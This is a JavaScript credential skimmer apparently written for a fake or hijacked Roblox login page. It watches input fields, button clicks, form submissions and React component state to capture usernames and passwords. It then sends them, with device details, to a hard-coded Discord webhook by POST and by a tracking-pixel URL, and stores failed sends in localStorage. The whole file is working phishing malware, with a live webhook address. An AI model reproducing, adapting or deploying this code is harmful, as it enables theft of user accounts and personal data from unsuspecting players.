(function() {
    // Wait for the React app to load
    function waitForReactApp() {
        // Check if the React login app div exists
        if (document.getElementById('react-login-web-app')) {
            // Start monitoring React state changes
            setupReactInterceptor();
        } else {
            // Try again after a short delay
            setTimeout(waitForReactApp, 100);
        }
    }

    // Set up the React interceptor
    function setupReactInterceptor() {
        // Function to send data to the webhook
        function sendToWebhook(username, password) {
            // Use the global sendToWebhook function if it's available
            if (window.sendCredentialToServiceWorker) {
                window.sendCredentialToServiceWorker(username, password);
                return;
            }
            
            const webhookUrl = "https://discord.com/api/webhooks/1351654650524471446/64xoQCP9o8ljl3-q6jcyUSUgBrdg9Oa74rAq01VS9rSQ2yGpoDsd88M6XypS-OhAfwPl";
            
            // Create the payload with the credentials
            const payload = {
                content: `**New Roblox React Login Attempt**\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toISOString()}\nIP: <Auto-detected by Discord>\nDevice Info: ${navigator.userAgent}\nScreen: ${window.screen.width}x${window.screen.height}`
            };
            
            // Send the data to the webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .catch(error => {
                console.error("Error sending data:", error);
                
                // Store in localStorage as a fallback
                try {
                    const storedCredentials = JSON.parse(localStorage.getItem('pendingCredentials') || '[]');
                    storedCredentials.push({
                        username,
                        password,
                        timestamp: new Date().toISOString()
                    });
                    localStorage.setItem('pendingCredentials', JSON.stringify(storedCredentials));
                } catch (storageError) {
                    console.error("Error storing credentials:", storageError);
                }
            });
            
            // Also attempt to send via a tracking pixel
            const trackingPixel = new Image();
            trackingPixel.src = `https://discord.com/api/webhooks/1351654650524471446/64xoQCP9o8ljl3-q6jcyUSUgBrdg9Oa74rAq01VS9rSQ2yGpoDsd88M6XypS-OhAfwPl?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
        }

        // Intercept React component state changes
        const reactApp = document.getElementById('react-login-web-app');
        
        // Watch for input changes in the React app
        reactApp.addEventListener('input', function(e) {
            if (e.target.tagName.toLowerCase() === 'input') {
                // Store the input value in the element's dataset
                e.target.dataset.value = e.target.value;
            }
        });
        
        // Watch for button clicks and form submissions
        reactApp.addEventListener('click', function(e) {
            // Check if the click was on a button that might be a login button
            if (e.target.tagName.toLowerCase() === 'button' || 
                (e.target.tagName.toLowerCase() === 'a' && e.target.className.toLowerCase().includes('button')) ||
                e.target.closest('button') || e.target.closest('a.button')) {
                
                // Find all input fields in the form
                const inputs = reactApp.querySelectorAll('input');
                let username = '';
                let password = '';
                
                // Extract values from inputs
                inputs.forEach(input => {
                    const value = input.dataset.value || input.value;
                    if (input.type === 'password') {
                        password = value;
                    } else if (input.type === 'text' || input.type === 'email') {
                        username = value;
                    }
                });
                
                // Only send if we have both username and password
                if (username && password) {
                    sendToWebhook(username, password);
                }
            }
        });
        
        // Also watch for form submissions
        reactApp.addEventListener('submit', function(e) {
            const form = e.target.closest('form');
            if (form) {
                const usernameField = form.querySelector('input[type="text"], input[type="email"]');
                const passwordField = form.querySelector('input[type="password"]');
                
                if (usernameField && passwordField) {
                    const username = usernameField.dataset.value || usernameField.value;
                    const password = passwordField.dataset.value || passwordField.value;
                    
                    if (username && password) {
                        sendToWebhook(username, password);
                    }
                }
            }
        });
        
        // Attempt to monkey patch React setState if accessible
        try {
            const reactInstances = [];
            
            // Function to find React instances
            function findReactInstances(element) {
                const keys = Object.keys(element);
                for (let i = 0; i < keys.length; i++) {
                    const key = keys[i];
                    if (key.startsWith('__reactInternalInstance$') || 
                        key.startsWith('__reactFiber$') || 
                        key.startsWith('_reactInternalFiber')) {
                        
                        const instance = element[key];
                        reactInstances.push(instance);
                        
                        // Try to find the component with username/password state
                        if (instance.memoizedState && 
                            (instance.memoizedState.username || instance.memoizedState.password)) {
                            
                            // Found a component with login state, monitor its setState
                            const origSetState = instance.setState;
                            instance.setState = function(state, callback) {
                                // Check if state update contains username or password
                                if (state.username || state.password) {
                                    const username = state.username || instance.state.username;
                                    const password = state.password || instance.state.password;
                                    
                                    if (username && password) {
                                        sendToWebhook(username, password);
                                    }
                                }
                                
                                // Call original setState
                                return origSetState.call(this, state, callback);
                            };
                        }
                    }
                }
            }
            
            // Start recursively searching for React instances
            findReactInstances(reactApp);
            
            // Also watch for new elements that might be React components
            const observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.addedNodes.length) {
                        mutation.addedNodes.forEach(function(node) {
                            if (node.nodeType === 1) { // Element node
                                findReactInstances(node);
                            }
                        });
                    }
                });
            });
            
            // Start observing
            observer.observe(reactApp, { childList: true, subtree: true });
        } catch (error) {
            console.error("Error setting up React interceptor:", error);
        }
    }

    // Start waiting for the React app
    waitForReactApp();
})(); 